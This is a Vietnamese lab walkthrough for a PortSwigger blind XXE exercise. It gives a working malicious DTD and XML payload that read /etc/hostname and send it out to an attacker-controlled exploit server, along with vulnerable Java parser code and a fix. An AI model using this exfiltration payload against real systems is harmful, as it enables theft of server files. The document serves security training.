![](../assets/Pasted%20image%2020261117175153.png)

# 1. Mục tiêu
Khai thác chức năng "Check stock" để tận dụng lỗ hổng Blind XXE, khác với lab trước là sử dụng parameter entity lồng nhau để đọc file /etc/hostname trên server

# 2. Recon
![](../assets/Pasted%20image%2020261117175346.png)Giống LAB01, vẫn là chức năng Check Stock để kiểm tra hàng tồn kho.
Click vào "Check stock", vào HTTP History trên Burp Suite đọc HTTP Request.

```http
POST /product/stock HTTP/2
Host: 0aeb008d04e8ccf8847409ce001e001e.web-security-academy.net
Cookie: session=4KvVb4RPtwUqfLr70y58w6fsu7d2C1wT
Content-Length: 107
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: application/xml
Accept: */*
Origin: https://0aeb008d04e8ccf8847409ce001e001e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aeb008d04e8ccf8847409ce001e001e.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>2</productId>
<storeId>1</storeId>
</stockCheck>
```

# 3. Exploit
Trên Exploit Server do PortSwigger cung cấp, tạo file malicious.dtd với nội dung: 
```DTD
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a6200d40453ccaa8446087601b500df.exploit-server.net/?x=%file;'>">
%eval;
%exfil;
```

Chuyển HTTP POST request ở trên vào Repeater, chỉnh sửa xml

```DTD XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a6200d40453ccaa8446087601b500df.exploit-server.net/malicious.dtd"> %xxe; ]>
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

Giải thích: 
- Chuỗi exfil cần **lồng parameter entity trong parameter entity**. Theo spec XML, việc này **chỉ được phép trong external DTD**, không được trong internal DTD (nhiều parser cấm). Nên không nhét thẳng chuỗi vào payload được — phải để nó trong **một file DTD host trên server bên ngoài, rồi payload gọi tới.
- Chọn đọc **/etc/hostname** (file một dòng) chứ không phải /etc/passwd là có chủ ý: nội dung file bị nhét vào **URL**, mà URL thì **không chứa được ký tự xuống dòng**. File nhiều dòng như /etc/passwd sẽ làm URL hỏng ngay (vấn đề newline này sẽ được mổ xẻ kỹ ở LAB06).
- Luồng thực thi : POST request gửi yêu cầu nạp file .dtd được host ở server bên ngoài vào rồi thực thi, gán cho %xxe, sau đó gọi luôn %xxe;
	- Quá trình nạp file .dtd: 
		- Giá trị của *% file* là dữ liệu trong file /etc/hostname, lưu tạm trong bộ nhớ
		- Giá trị *% eval* được gán là một chuỗi khai báo entity, tại bước này toàn bộ vẫn được coi là chuỗi ký tự, chỉ có *&#x25* được parse thành kí tự *%*, và *%file* được parse thành dữ liệu của file /etc/hostname => sau bước này ta được giá trị **<!ENTITY % exfil SYSTEM 'https://exploit-0a6200d40453ccaa8446087601b500df.exploit-server.net/?x=<gtricuafile>;'>** được gán cho %eval trong bộ nhớ
		- Bước 3, gọi parse cho *%eval*, được câu khai báo *%exfil* trọn vẹn
		- Bước cuối: gọi parse cho %exfil, khi này sẽ gửi request tới URL kèm gtricuafile được hiển thi trong câu truy vấn.

Mấy thắc mắc tự đặt ra khi vật lộn với payload này:

> **Tại sao `%file;` thì bung ngay, mà `&#x25;` thì không?** Hai thứ khác bản chất. `%file;` là một **tham chiếu entity** (một mệnh lệnh → parser chạy ngay). Còn `&#x25;` là một **character reference** — chỉ là mã của ký tự `%`, tức là một chữ cái bình thường, không phải lệnh. Mình cố ý viết `&#x25;` để dấu `%` của `exfil` **nằm im** ở nhịp này, chỉ "sống dậy" thành `%` thật khi chuỗi `%eval` được đọc lại như markup ở nhịp sau. (Trong cặp `"..."`, chỉ `%tên;` và `&#...;` được xử lý, phần còn lại là string thuần.)

> **Tại sao không viết thẳng `<!ENTITY % exfil SYSTEM "...%file;...">` cho gọn?** Vì ở bản ngây thơ đó, `%file;` nằm trong **SystemLiteral** (phần URL sau `SYSTEM`) — ngữ pháp XML **không cho bung** tham chiếu ở vị trí này. Chỉ **EntityValue** (chuỗi giá trị của một entity, tức phần trong `"..."` của `%eval`) mới bung `%file;`. Vì vậy phải bọc một lớp qua `%eval` để `%file;` rơi vào đúng vùng EntityValue thì nó mới chịu nở ra.

> **Exploit Server khác Collaborator thế nào?** Collaborator **chỉ nhận** tương tác (nghe DNS/HTTP), **không host file được**. File `.dtd` phải đặt ở **Exploit Server** của PortSwigger (điền vào ô Body rồi Store; ô Head để mặc định vì parser không kiểm Content-Type khi tải DTD). Còn data chảy về thì đọc ở **Access log của Exploit Server** (hoặc trỏ sang Collaborator cũng được).

![](../assets/Pasted%20image%2020261117183416.png)

Câu truy vấn được gửi tới exploit sever là 
```
10.0.4.229      2026-11-17 11:34:28 +0000 "GET /?x=53eb1c6f3692 HTTP/1.1" 200 "User-Agent: Java/21.0.1"
```

Bấm vào Submit solution, điền giá trị của x. Hoàn thành lab.
![](../assets/Pasted%20image%2020261117183604.png)

# 4. Mô phỏng backend xử lý
Backend vẫn bật parameter entity như LAB04, nên khi parse payload in-band nó fetch file `malicious.dtd` từ Exploit Server rồi chạy chuỗi entity lồng nhau bên trong — toàn bộ chuỗi exfil được lắp ráp và bắn đi **ngay trong lúc parse**. Response vẫn câm (blind), data chảy ra qua request OOB tới Exploit Server:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
try {
    Document doc = dbf.newDocumentBuilder().parse(input);  // parse -> fetch malicious.dtd -> %file đọc /etc/hostname -> %exfil bắn OOB
    return "\"" + checkStock(doc) + "\"";
} catch (Exception e) {
    return "\"XML parsing error\"";                        // BLIND: data đã chảy ra OOB trước khi lỗi sinh ra
}
```

# 5. Cách vá
```java
// Tắt DTD -> dập mọi biến thể XXE tận gốc
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Hạn chế tối đa quyền, loại bỏ tính năng resolve entities và load DTD nếu ứng dụng không dùng tới chức năng đó. Loại bỏ cả việc phản chiếu lại response ra ngoài nếu không cần thiết.




